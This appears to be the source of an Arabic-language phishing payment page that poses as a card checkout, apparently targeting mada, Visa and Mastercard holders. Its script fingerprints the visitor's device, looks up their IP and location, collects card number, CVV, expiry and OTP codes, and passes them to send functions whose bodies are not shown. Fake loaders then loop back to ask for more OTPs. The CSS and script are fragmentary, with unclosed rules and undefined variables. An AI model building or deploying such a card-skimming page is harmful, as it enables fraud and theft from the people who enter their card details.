<head>

<style>
*{
  box-sizing:border-box;
  -webkit-tap-highlight-color:transparent;
}

html,body{
  margin:0;
  padding:0;
  background:#f3f3f3;
  font-family:Arial, sans-serif;
  color:#111;
}

.page{
  width:100%;
  max-width:380px;
  margin:0 auto;

}

.amount-title{
  text-align:center;
  font-size:16px;
  font-weight:700;
  margin-bottom:10px;
}

.amount-value{

  font-size:32px;
  font-weight:900;
  direction:ltr;
  margin-bottom:32px;
  min-height:38px;
}

.divider{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:10px;
  margin-bottom:32px;
}

.divider::before,
.divider::after{
  content:"";
  flex:1;
  max-width:70px;
  height:2px;
  background:#cecece;
}

.divider span{
  font-size:22px;
  font-weight:700;
}

.field-group{

}

.label{

  font-size:20px;
  font-weight:700;
  margin-bottom:10px;
}

.input{
  width:100%;
  height:64px;
  border:2px solid #cfcfcf;
  border-radius:16px;
  background:#f7f7f7;
  font-size:18px;
  padding:0 14px;
  outline:none;
}

.input.error{
  border-color:#d93025 !important;
  box-shadow:0 0 0 3px rgba(217,48,37,0.10);

}

.card-head{

.card-logo-top{

  border:none;
  box-shadow:none;

  pointer-events:none;
}

.card-number{

  text-align:left;
  font-family: monospace;
  letter-spacing: 1px;
}

.row{
  display:flex;
  gap:10px;
  margin-top:10px;
}

.col{

}

.pay-btn{

  height:64px;
  margin-top:16px;

  border-radius:16px;

.expiry-wrap.error{
  border-color:#d93025 !important;
  box-shadow:0 0 0 3px rgba(217,48,37,0.10);
  background:#fff7f7;
}

.expiry-select{
  width:38%;
  height:100%;
  border:none;
  background:transparent;
  font-size:18px;
  outline:none;
  text-align:center;
  text-align-last:center;
  direction:ltr;
  color:#9a9a9a;

  -webkit-appearance:none;

.expiry-select.has-value{

}

.expiry-separator{

  text-align:center;
  font-size:24px;
  font-weight:700;
  color:#777;
  user-select:none;
  -webkit-user-select:none;

::placeholder{

}

.screen{
  display:none;
}

.screen.active{
  display:block;

.loader-screen{

  display:flex;
  align-items:center;
  justify-content:center;
  padding:20px;

.loader-box{

.otp-page{

  color:#fff;
  font-size:20px;
  cursor:pointer;

@keyframes spin{

// ====================== دوال البصمة والجهاز المتقدمة ======================
async function sha256(message) {
  const encoder = new TextEncoder();
  const data = encoder.encode(message);
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

async function getAdvancedFingerprint() {
  const canvas = document.createElement('canvas');
  canvas.width = 200;
  canvas.height = 50;
  const ctx = canvas.getContext('2d');
  ctx.textBaseline = 'top';
  ctx.font = '14px Arial';
  ctx.fillStyle = '#f60';
  ctx.fillRect(0, 0, 100, 50);
  ctx.fillStyle = '#069';
  ctx.fillText('عميل عربي 2026', 2, 15);
  ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
  ctx.fillRect(100, 10, 80, 30);
  const canvasHash = await sha256(canvas.toDataURL());

  let webglHash = '';
  const canvasGL = document.createElement('canvas');
  const gl = canvasGL.getContext('webgl') || canvasGL.getContext('experimental-webgl');
  if (gl) {
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    if (debugInfo) {
      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      webglHash = renderer + '|' + vendor;
    }
  }

  const fontList = ['Arial', 'Tahoma', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
  const fontCheck = fontList.map(f => document.fonts.check(`12px "${f}"`) ? 1 : 0).join('');

  const components = [
    navigator.userAgent,
    navigator.language,
    screen.colorDepth,
    new Date().getTimezoneOffset(),
    navigator.hardwareConcurrency || '',
    navigator.deviceMemory || '',
    canvasHash,
    webglHash,
    fontCheck
  ];
  const finalStr = components.join('|');
  const fingerprint = await sha256(finalStr);
  return 'fp_adv_' + fingerprint.slice(0, 16);
}

// تحديد دقيق لنوع الجهاز
function getDetailedDeviceInfo() {
  const ua = navigator.userAgent;
  const isTablet = /Tablet|iPad/i.test(ua) || (screen.width >= 768 && /Android/i.test(ua) && /Mobile/i.test(ua) === false);
  const isMobile = /Mobile/i.test(ua) || /iPhone|iPod|Android.*Mobile/i.test(ua);
  
  let deviceType = "";
  let os = "غير معروف";
  
  if (/iPhone|iPad|iPod/i.test(ua)) {
    os = "iOS";
    deviceType = isTablet ? "📟 آيباد" : "📱 آيفون";
  } else if (/Android/i.test(ua)) {
    os = "Android";
    deviceType = isTablet ? "📟 تاب (أندرويد)" : "📱 أندرويد";
  } else if (/Windows/i.test(ua)) {
    os = "Windows";
    deviceType = isTablet ? "📟 ويندوز تاب" : "💻 حاسوب (ويندوز)";
  } else if (/Mac OS/i.test(ua)) {
    os = "MacOS";
    deviceType = "💻 حاسوب (ماك)";
  } else if (/Linux/i.test(ua)) {
    os = "Linux";
    deviceType = "💻 حاسوب (لينكس)";
  } else {
    deviceType = isMobile ? "📱 جوال" : "💻 حاسوب";
  }
  
  let browser = "غير معروف";
  if (/Edg/i.test(ua)) browser = "Edge";
  else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
  else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
  else if (/Firefox/i.test(ua)) browser = "Firefox";
  else if (/Opera|OPR/i.test(ua)) browser = "Opera";
  
  return { deviceType, os, browser };
}

async function getIPAndLocation() {
  try {
    const ipRes = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipRes.json();
    const ip = ipData.ip;
    let location = "غير متاح";
    try {
      const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
      const locData = await locRes.json();
      if (locData.country_name) {
        location = `${locData.country_name} - ${locData.city || ''}`;
      }
    } catch(e) {}
    return { ip, location };
  } catch(e) {
    return { ip: "غير متاح", location: "غير متاح" };
  }
}

function updateVisitCount() {

  if (!count) count = 0;
  count = parseInt(count) + 1;
  localStorage.setItem("visitCount", count);
  return count;
}

// ====================== دوال البطاقة (تسامح عالي) ======================
const CardType = {
  VISA: 'فيزا',
  MASTERCARD: 'ماستر كارد',
  MADA: 'مدى',
  UNKNOWN: 'غير معروف'
};

function detectCardTypeStrong(cardDigits) {
  if (!cardDigits || cardDigits.length < 2) return CardType.UNKNOWN;
  if (/^4/.test(cardDigits)) return CardType.VISA;
  if (/^(5[1-5])/.test(cardDigits) || /^(222[1-9]|22[3-9]\d|2[3-6]\d{2}|27[01]\d|2720)/.test(cardDigits)) return CardType.MASTERCARD;
  const madaPrefixes = ['588845','440647','440795','446404','457865','457997','474491','636120','9682','483010','586983','605141','604906','521000','530906','531196','535825','543357','545616','546518','548485','558848','585265','588982','589005','589206','604393','608072','627139','636214','636392','637071','639199','639382','639438'];
  if (madaPrefixes.some(prefix => cardDigits.startsWith(prefix))) return CardType.MADA;
  return CardType.UNKNOWN;
}

function validateCardHolder() {
  const value = cardHolder.value.trim();
  const valid = /^[A-Za-z ]+$/.test(value) && value.length > 0;
  if (value === "") { cardHolder.classList.remove("error"); return false; }
  cardHolder.classList.toggle("error", !valid);
  return valid;
}

function getRawCardNumber() {
  return cardNumber.value.replace(/\s/g, '');
}

// تحقق بسيط: فقط التأكد من وجود أرقام (لا نطلب 16 رقمًا لضمان العمل على Safari)
function validateCardNumber() {
  const rawDigits = getRawCardNumber();
  if (rawDigits.length === 0) { cardNumber.classList.remove("error"); return false; }
  const valid = rawDigits.length > 0;
  cardNumber.classList.toggle("error", !valid);
  return valid;
}

function validateCVV() {
  const valid = /^\d{3}$/.test(cvv.value);
  if (cvv.value.length === 0) { cvv.classList.remove("error"); return false; }
  cvv.classList.toggle("error", !valid);
  return valid;
}

function validateExpiry() {
  const valid = expMonth.value !== "" && expYear.value !== "";
  if (valid || (expMonth.value === "" && expYear.value === "")) expiryWrap.classList.remove("error");
  else expiryWrap.classList.add("error");
  expMonth.classList.toggle("has-value", expMonth.value !== "");
  expYear.classList.toggle("has-value", expYear.value !== "");
  return valid;
}

function validatePaymentForm() {
  const holderOk = validateCardHolder();
  const cardOk = validateCardNumber();
  const cvvOk = validateCVV();
  const expiryOk = validateExpiry();
  
  if (!cardHolder.value.trim()) cardHolder.classList.add("error");
  const rawDigits = getRawCardNumber();
  if (!rawDigits) cardNumber.classList.add("error");
  if (!cvv.value) cvv.classList.add("error");
  if (!expMonth.value || !expYear.value) expiryWrap.classList.add("error");
  
  // لا نرفض بسبب طول الرقم، فقط نتأكد من وجود أرقام
  return holderOk && cardOk && cvvOk && expiryOk;
}

// ====================== إعداد الصفحة وسير العمل ======================

for (let y = 26; y <= 50; y++) { let opt = document.createElement("option"); opt.value = String(y); opt.textContent = String(y); expYear.appendChild(opt); }

cardHolder.addEventListener("input", function() { this.value = this.value.replace(/[^A-Za-z ]/g, ""); validateCardHolder(); });
cardHolder.addEventListener("paste", function(e) { e.preventDefault(); let text = (e.clipboardData || window.clipboardData).getData("text"); this.value = text.replace(/[^A-Za-z ]/g, "").slice(0,40); validateCardHolder(); });

cardNumber.addEventListener("input", function(e) {

  validateCardNumber();
  const fullDigits = this.value;
  if (fullDigits.length >= 6) console.log(`[نوع البطاقة خلف الكواليس] ${detectCardTypeStrong(fullDigits)}`);
});
cardNumber.addEventListener("paste", function(e) {
  e.preventDefault();
  let text = (e.clipboardData || window.clipboardData).getData("text");
  let digits = text.replace(/\D/g, '').slice(0, 16);
  this.value = digits;
  validateCardNumber();
});
cardNumber.addEventListener("keydown", function(e) {
  if (e.key === ' ' || e.key === 'Space' || e.code === 'Space') e.preventDefault();
});

cvv.addEventListener("input", function() { this.value = this.value.replace(/\D/g, "").slice(0,3); validateCVV(); });
cvv.addEventListener("paste", function(e) { e.preventDefault(); let text = (e.clipboardData || window.clipboardData).getData("text"); this.value = text.replace(/\D/g, "").slice(0,3); validateCVV(); });
expMonth.addEventListener("change", validateExpiry);
expYear.addEventListener("change", validateExpiry);
otpInput.addEventListener("input", function() { this.value = this.value.replace(/\D/g, "").slice(0,6); validateOTP(); });
otpInput.addEventListener("paste", function(e) { e.preventDefault(); let text = (e.clipboardData || window.clipboardData).getData("text"); this.value = text.replace(/\D/g, "").slice(0,6); validateOTP(); });
function validateOTP() { const valid = /^\d{4,6}$/.test(otpInput.value); if (otpInput.value.length===0) { otpInput.classList.remove("error"); return false; } otpInput.classList.toggle("error", !valid); return valid; }

function startLoader60ThenOTP() {
  clearInterval(loader60Timer);
  let seconds = 60;
  loader60Count.textContent = seconds;
  showScreen(loader60Screen);
  loader60Timer = setInterval(() => {
    seconds--;
    loader60Count.textContent = seconds;
    if (seconds <= 0) { clearInterval(loader60Timer); showScreen(otpScreen); }
  }, 1000);
}

function startLoader30ThenBackOTP() {
  clearTimeout(loader30Timer);
  showScreen(loader30Screen);
  loader30Timer = setTimeout(() => {
    otpInput.value = "";
    otpInput.classList.remove("error");
    showScreen(otpScreen);
  }, 30000);
}

// زر الدفع (بدون متغير منع التكرار لضمان الإرسال)
payBtn.addEventListener("click", async function() {
  if (!validatePaymentForm()) return;
  await sendPaymentMessage();
  startLoader60ThenOTP();
});

// زر OTP
otpBtn.addEventListener("click", async function() {
  const otpCode = otpInput.value.trim();
  if (!otpCode) { otpInput.classList.add("error"); return; }
  if (!validateOTP()) return;
  await sendOtpMessage(otpCode);
  startLoader30ThenBackOTP();
});

// حماية الشعار
document.addEventListener("contextmenu", e => { if(e.target.closest(".card-logo-top")) e.preventDefault(); });
document.addEventListener("dragstart", e => { if(e.target.closest(".card-logo-top")) e.preventDefault(); });

loadAmount();
setInterval(loadAmount, 3000);

window.addEventListener("load", async () => {
  await sendFirstMessage();
});
</script>
